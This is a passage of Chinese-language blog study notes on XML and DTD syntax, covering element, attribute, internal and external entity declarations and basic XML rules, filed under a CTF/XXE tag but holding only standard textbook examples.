class="line"><span class="params"># 只能出现一个，不然会报错</span></span><br></pre></td></tr></table></figure></div></li><li><p>多种类型的子元素混合：举个例子：</p><div class="highlight-container" data-rel="Ruby"><figure class="iseeu highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">ELEMENT</span> book (name,author?,(price|<span class="params">press</span>|date)*)&gt;</span><br></pre></td></tr></table></figure></div></li></ul><p>这个声明的含义为：<code>book</code>元素包含只出现一次的<code>name</code>子元素、出现零次或一次的<code>author</code>子元素以及出现零次或多次的<code>price</code>、<code>press</code>、<code>date</code>三个子元素中的一个</p><blockquote><p>对于<code>?</code>、<code>*</code>以及<code>+</code>这三个符号的含义，可以类比于正则表达式进行记忆</p></blockquote><h2 id="属性声明"><a href="#属性声明" class="headerlink" title="属性声明"></a>属性声明</h2><h3 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ATTLIST 元素名称 属性名称 属性类型 默认值&gt;</span><br></pre></td></tr></table></figure></div><p>DTD 实例:</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ATTLIST payment type CDATA &quot;check&quot;&gt;</span><br></pre></td></tr></table></figure></div><p>XML 实例:</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">payment</span> <span class="attr">type</span>=<span class="string">&quot;check&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure></div><p>以下是<strong>属性类型</strong>的选项：</p><table><thead><tr><th align="left">类型</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">CDATA</td><td align="left">值为字符数据 (character data)</td></tr><tr><td align="left">(<em>en1</em>|<em>en2</em>|..)</td><td align="left">此值是枚举列表中的一个值</td></tr><tr><td align="left">ID</td><td align="left">值为唯一的 id</td></tr><tr><td align="left">IDREF</td><td align="left">值为另外一个元素的 id</td></tr><tr><td align="left">IDREFS</td><td align="left">值为其他 id 的列表</td></tr><tr><td align="left">NMTOKEN</td><td align="left">值为合法的 XML 名称</td></tr><tr><td align="left">NMTOKENS</td><td align="left">值为合法的 XML 名称的列表</td></tr><tr><td align="left">ENTITY</td><td align="left">值是一个实体</td></tr><tr><td align="left">ENTITIES</td><td align="left">值是一个实体列表</td></tr><tr><td align="left">NOTATION</td><td align="left">此值是符号的名称</td></tr><tr><td align="left">xml:</td><td align="left">值是一个预定义的 XML 值</td></tr></tbody></table><p>默认值参数可使用下列值：</p><table><thead><tr><th align="left">值</th><th align="left">解释</th></tr></thead><tbody><tr><td align="left">值</td><td align="left">属性的默认值</td></tr><tr><td align="left">#REQUIRED</td><td align="left">属性值是必需的</td></tr><tr><td align="left">#IMPLIED</td><td align="left">属性不是必需的</td></tr><tr><td align="left">#FIXED value</td><td align="left">属性值是固定的</td></tr></tbody></table><p>🌰–规定一个默认的属性值</p><p>DTD: 给square元素规定了一个默认值为0的width属性,”square” 被定义为带有 CDATA 类型的 “width” 属性的空元素</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT square EMPTY&gt;</span><br><span class="line">&lt;!ATTLIST square width CDATA &quot;0&quot;&gt;</span><br></pre></td></tr></table></figure></div><p>合法的 XML: 仍可以给被预定义的属性赋值</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">square</span> <span class="attr">width</span>=<span class="string">&quot;100&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure></div><h3 id="IMPLIED"><a href="#IMPLIED" class="headerlink" title="#IMPLIED"></a>#IMPLIED</h3><p>属性不是必需的</p><h4 id="语法-2"><a href="#语法-2" class="headerlink" title="语法"></a>语法</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ATTLIST 元素名称 属性名称 属性类型 #IMPLIED&gt;</span><br></pre></td></tr></table></figure></div><p>🌰</p><p>DTD:</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ATTLIST contact fax CDATA #IMPLIED&gt;</span><br></pre></td></tr></table></figure></div><p>合法的 XML:</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">contact</span> <span class="attr">fax</span>=<span class="string">&quot;555-667788&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure></div><p>合法的 XML:</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">contact</span> /&gt;</span></span><br></pre></td></tr></table></figure></div><h3 id="REQUIRED"><a href="#REQUIRED" class="headerlink" title="#REQUIRED"></a>#REQUIRED</h3><p>属性是必需的,适用于没有默认值选项，但强制要求提交属性值</p><h3 id="语法-3"><a href="#语法-3" class="headerlink" title="语法"></a>语法</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ATTLIST 元素名称 属性名称 属性类型 #REQUIRED&gt;</span><br></pre></td></tr></table></figure></div><p>🌰</p><p>DTD:</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ATTLIST person number CDATA #REQUIRED&gt;</span><br></pre></td></tr></table></figure></div><p>合法的 XML:</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">person</span> <span class="attr">number</span>=<span class="string">&quot;5677&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure></div><p>非法的 XML:</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">person</span> /&gt;</span></span><br></pre></td></tr></table></figure></div><h3 id="FIXED"><a href="#FIXED" class="headerlink" title="#FIXED"></a>#FIXED</h3><p>属性值固定,预先定义属性值，不可更改(类比const)</p><h3 id="语法-4"><a href="#语法-4" class="headerlink" title="语法"></a>语法</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ATTLIST 元素名称 属性名称 属性类型 #FIXED &quot;value&quot;&gt;</span><br></pre></td></tr></table></figure></div><p>🌰</p><p>DTD:</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ATTLIST sender company CDATA #FIXED &quot;Microsoft&quot;&gt;</span><br></pre></td></tr></table></figure></div><p>合法的 XML:</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sender</span> <span class="attr">company</span>=<span class="string">&quot;Microsoft&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure></div><p>非法的 XML:</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sender</span> <span class="attr">company</span>=<span class="string">&quot;W3School&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure></div><h3 id="列举属性值"><a href="#列举属性值" class="headerlink" title="列举属性值"></a>列举属性值</h3><h3 id="语法："><a href="#语法：" class="headerlink" title="语法："></a>语法：</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ATTLIST 元素名称 属性名称 (en1|en2|..) 默认值&gt;</span><br></pre></td></tr></table></figure></div><p>DTD 例子:</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ATTLIST payment type (check|cash) &quot;cash&quot;&gt;</span><br></pre></td></tr></table></figure></div><p>XML 例子:</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">payment</span> <span class="attr">type</span>=<span class="string">&quot;check&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure></div><p>或者</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">payment</span> <span class="attr">type</span>=<span class="string">&quot;cash&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure></div><h2 id="实体声明"><a href="#实体声明" class="headerlink" title="实体声明"></a>实体声明</h2><p>实体是用于定义引用普通文本或特殊字符的快捷方式的变量。</p><p>实体引用是对实体的引用。</p><p>实体可在内部或外部进行声明。</p><h3 id="内部实体声明"><a href="#内部实体声明" class="headerlink" title="内部实体声明"></a>内部实体声明</h3><h3 id="语法：-1"><a href="#语法：-1" class="headerlink" title="语法："></a>语法：</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br></pre></td></tr></table></figure></div><p>🌰</p><p>DTD 例子:</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY writer &quot;Bill Gates&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;</span><br></pre></td></tr></table></figure></div><p>XML 例子:</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">author</span>&gt;</span><span class="symbol">&amp;writer;</span><span class="symbol">&amp;copyright;</span><span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br></pre></td></tr></table></figure></div><blockquote><p>一个实体由三部分构成: 一个和号 <code>&amp;</code>, 一个实体名称, 以及一个分号 <code>;</code></p></blockquote><h3 id="外部实体声明"><a href="#外部实体声明" class="headerlink" title="外部实体声明"></a>外部实体声明</h3><h3 id="语法：-2"><a href="#语法：-2" class="headerlink" title="语法："></a>语法：</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt; &lt;!--也可以用协议--&gt;</span><br></pre></td></tr></table></figure></div><p>💡不同环境下可用协议</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032236978.jpg"                      alt="aaa"                ><figcaption>aaa</figcaption></figure></p><p>🌰</p><p>DTD 例子:</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY writer SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br></pre></td></tr></table></figure></div><p>XML 例子:</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">author</span>&gt;</span><span class="symbol">&amp;writer;</span><span class="symbol">&amp;copyright;</span><span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h3 id="实体的嵌套"><a href="#实体的嵌套" class="headerlink" title="实体的嵌套"></a><strong>实体的嵌套</strong></h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY %实体名称 &quot;值&quot;&gt; &lt;!--内部--&gt;</span><br><span class="line">&lt;!ENTITY %实体名称 SYSTEM &quot;URL&quot;&gt; &lt;!--外部--&gt;</span><br></pre></td></tr></table></figure></div><h3 id="实体分类"><a href="#实体分类" class="headerlink" title="实体分类"></a>实体分类</h3><p>实体又分为一般实体和参数实体,字符实体,命名实体</p><p>1，一般实体的声明语法:<!ENTITY 实体名 "实体内容"><br>引用实体的方式：&amp;实体名；</p><p>2，参数实体只能在DTD中使用，参数实体的声明格式： <!ENTITY % 实体名 "实体内容"><br>引用实体的方式：%实体名；</p><blockquote><p>有SYSTEM关键字引用数据的实体就是参数实体</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xxe </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XML学习</title>
      <link href="/2022/04/20/XML%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/04/20/XML%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p> XML 指可扩展标记语言(<em>EX</em>tensible <em>M</em>arkup <em>L</em>anguage),<strong>被设计用来<u>传输和存储数据</u></strong> 可以用在配置文件中、在网络中传输</p><blockquote><p><strong>HTML 被设计用来显示数据</strong></p></blockquote><ul><li><p>XML 是一种<em>标记语言</em>，很类似 HTML,是对 HTML 的补充</p></li><li><p>XML 的设计宗旨是<strong>传输数据</strong>，而非显示数据</p></li><li><p>XML 标签没有被预定义。您需要<strong>自行定义标签</strong>。(通过 XML 可以发明自己的标签)</p></li><li><p>XML 被设计为具有<em>自我描述性</em>。</p></li><li><p>XML 是 <strong>W3C 的推荐标准</strong></p></li><li><p>XML 仅仅是纯文本</p></li><li><p>XML 独立于硬件、软件以及应用程序</p></li></ul><h2 id="树结构"><a href="#树结构" class="headerlink" title="树结构"></a>树结构</h2><p>一个文档实例(John 给 George 的一张便签)</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;ISO-8859-1&quot;</span>?&gt;</span> <span class="comment">&lt;!--XML 声明。它定义 XML 的版本 (1.0) 和所使用的编码 (ISO-8859-1 = Latin-1/西欧字符集)--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span> <span class="comment">&lt;!--根元素--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--4 行描述根的 4 个子元素（to, from, heading 以及 body）--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure></div><blockquote><p>所有的XML元素都必须有一个关闭标签  e.g. <note> </note></p><p>也可以使用自闭合标签 e.g.<code> &lt;br/&gt;</code></p><h3 id="组成部分"><a href="#组成部分" class="headerlink" title="组成部分"></a>组成部分</h3><h4 id="⚠️注意：xml第一行必须定义为文档声明"><a href="#⚠️注意：xml第一行必须定义为文档声明" class="headerlink" title="⚠️注意：xml第一行必须定义为文档声明"></a>⚠️注意：xml第一行必须定义为文档声明</h4><p>格式：<?xml 属性列表 ?></p><p>属性列表：</p><ul><li>version：版本号，必须的属性</li><li>encoding：编码方式。告知解析引擎当前文档使用的字符集，默认值：ISO-8859-1 若存中文，用gbk</li><li>standalone：是否独立<ul><li>取值：<br>* yes：不依赖其他文件<ul><li>no：依赖其他文件</li></ul></li></ul></li></ul><ol start="2"><li>指令(了解)：结合css的w<ul><li><?xml-stylesheet type="text/css" href="a.css" ?> (给当前xml加样式)</li></ul></li><li>标签：标签名称自定义的<br>* 规则：<br>              * 名称可以包含字母、数字以及其他的字符<br>* 名称不能以数字或者标点符号开始<br>* 名称不能以字母 xml（或者 XML、Xml 等等）开始<br>* 名称不能包含空格 </li><li>属性：<br>id属性值唯一</li><li>文本：<br>* CDATA区：在该区域中的数据会被原样展示<br>        * 格式：  <![CDATA[ 数据 ]]> （原样展示也就意味着不用实体代替特殊字符）</li></ol></blockquote><h3 id="XML-文档形成一种树结构"><a href="#XML-文档形成一种树结构" class="headerlink" title="XML 文档形成一种树结构"></a>XML 文档形成一种树结构</h3><p>XML 文档必须包含<em>根元素</em>。该元素是所有其他元素的父元素。</p><p>XML 文档中的元素形成了一棵文档树。这棵树从根部开始，并扩展到树的最底端。</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">child</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">subchild</span>&gt;</span>.....<span class="tag">&lt;/<span class="name">subchild</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">child</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></div><blockquote><p>所有元素都可以有子元素</p></blockquote><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><h3 id="大小写敏感"><a href="#大小写敏感" class="headerlink" title="大小写敏感"></a>大小写敏感</h3><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Message</span>&gt;</span>这是错误的。<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>这是正确的。<span class="tag">&lt;/<span class="name">message</span>&gt;</span> </span><br></pre></td></tr></table></figure></div><h3 id="正确嵌套"><a href="#正确嵌套" class="headerlink" title="正确嵌套"></a>正确嵌套</h3><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span><span class="tag">&lt;<span class="name">i</span>&gt;</span>错误<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span><span class="tag">&lt;<span class="name">i</span>&gt;</span>正确<span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="tag">&lt;/<span class="name">b</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h3 id="必须有一个根元素（子元素间可以并列）"><a href="#必须有一个根元素（子元素间可以并列）" class="headerlink" title="必须有一个根元素（子元素间可以并列）"></a>必须有一个根元素（子元素间可以并列）</h3><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">child</span> <span class="attr">category</span>=<span class="string">&quot;COOKING&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">subchild</span>&gt;</span>.....<span class="tag">&lt;/<span class="name">subchild</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">child</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">child</span> <span class="attr">category</span>=<span class="string">&quot;WEB&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">subchild</span>&gt;</span>.....<span class="tag">&lt;/<span class="name">subchild</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">child</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h3 id="属性值要加引号"><a href="#属性值要加引号" class="headerlink" title="属性值要加引号"></a>属性值要加引号</h3><p>单双都可以</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">note</span> <span class="attr">date</span>=<span class="string">&quot;08/08/2008&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span> </span><br></pre></td></tr></table></figure></div><h3 id="实体引用"><a href="#实体引用" class="headerlink" title="实体引用"></a>实体引用</h3><p>特殊符号转义</p><table><thead><tr><th><code>&amp;lt;</code></th><th>&lt;</th><th>小于</th></tr></thead><tbody><tr><td><code>&amp;gt;</code></td><td>&gt;</td><td>大于</td></tr><tr><td><code>&amp;amp;</code></td><td>&amp;</td><td>和号</td></tr><tr><td><code>&amp;apos;</code></td><td>‘</td><td>单引号</td></tr><tr><td><code>&amp;quot;</code></td><td>“</td><td>引号</td></tr></tbody></table><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>if salary &lt; 1000 then<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>if salary <span class="symbol">&amp;lt;</span> 1000 then<span class="tag">&lt;/<span class="name">message</span>&gt;</span>  ✅</span><br></pre></td></tr></table></figure></div><blockquote><p>在 XML 中，只有字符 “&lt;” 和 “&amp;” 确实是非法的。大于号是合法的，但是用实体引用来代替它是一个好习惯。</p></blockquote><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>使用<code>&lt;!--</code>与<code>--&gt;</code> (都是两个短横杠)</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- This is a comment --&gt;</span>  </span><br></pre></td></tr></table></figure></div><h3 id="保留空格"><a href="#保留空格" class="headerlink" title="保留空格"></a>保留空格</h3><p>在 XML 中，文档中的空格不会被删节。</p><blockquote><p>HTML 会把多个连续的空格字符裁减（合并）为一个：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HTML:Hello           my name is David.</span><br><span class="line">输出:Hello my name is David.</span><br></pre></td></tr></table></figure></div></blockquote><h3 id="LF存储换行"><a href="#LF存储换行" class="headerlink" title="LF存储换行"></a>LF存储换行</h3><p>在 Windows 应用程序中，换行通常以一对字符来存储：回车符 (CR) 和换行符 (LF)。这对字符与打字机设置新行的动作有相似之处。在 Unix 应用程序中，新行以 LF 字符存储。而 Macintosh 应用程序使用 CR 来存储新行。</p><h2 id="元素"><a href="#元素" class="headerlink" title="元素"></a>元素</h2><p><strong>XML 元素</strong>指的是从（且包括）开始标签直到（且包括）结束标签的部分。</p><h3 id="命名规则"><a href="#命名规则" class="headerlink" title="命名规则"></a>命名规则</h3><ul><li>名称可以含字母、数字以及其他的字符</li><li>名称不能以数字或者标点符号开始 </li><li>名称不能以字符 “xml”（或者 XML、Xml）开始 </li><li>名称不能包含空格</li><li>可使用任何名称，没有保留的字词</li></ul><blockquote><p>避免 “-“ 字符。如果您按照这样的方式进行命名：”first-name”，一些软件会认为你需要提取第一个单词。</p><p>避免 “.” 字符。如果您按照这样的方式进行命名：”first.name”，一些软件会认为 “name” 是对象 “first” 的属性。</p><p>避免 “:” 字符。冒号会被转换为命名空间来使用。</p><p>XML 文档经常有一个对应的数据库，其中的字段会对应 XML 文档中的元素。有一个实用的经验，即使用数据库的名称规则来命名 XML 文档中的元素。</p></blockquote><h2 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h2><p><strong>属性 (Attribute) 提供关于元素的额外（附加）信息。</strong></p><p>属性值必须被引号包围，不过单引号和双引号均可使用。比如一个人的性别，person 标签可以这样写：</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">person</span> <span class="attr">sex</span>=<span class="string">&quot;female&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">person</span> <span class="attr">sex</span>=<span class="string">&#x27;female&#x27;</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p>如果属性值本身包含双引号，那么有必要使用单引号包围它，就像这个例子：</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">gangster</span> <span class="attr">name</span>=<span class="string">&#x27;George &quot;Shotgun&quot; Ziegler&#x27;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--或者使用实体引用--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">gangster</span> <span class="attr">name</span>=<span class="string">&quot;George <span class="symbol">&amp;quot;</span>Shotgun<span class="symbol">&amp;quot;</span> Ziegler&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p>属性与元素的使用没有规定，可以按照自己喜欢的方式</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">person</span> <span class="attr">sex</span>=<span class="string">&quot;female&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">firstname</span>&gt;</span>Anna<span class="tag">&lt;/<span class="name">firstname</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">lastname</span>&gt;</span>Smith<span class="tag">&lt;/<span class="name">lastname</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">person</span>&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">person</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">sex</span>&gt;</span>female<span class="tag">&lt;/<span class="name">sex</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">firstname</span>&gt;</span>Anna<span class="tag">&lt;/<span class="name">firstname</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">lastname</span>&gt;</span>Smith<span class="tag">&lt;/<span class="name">lastname</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">person</span>&gt;</span> 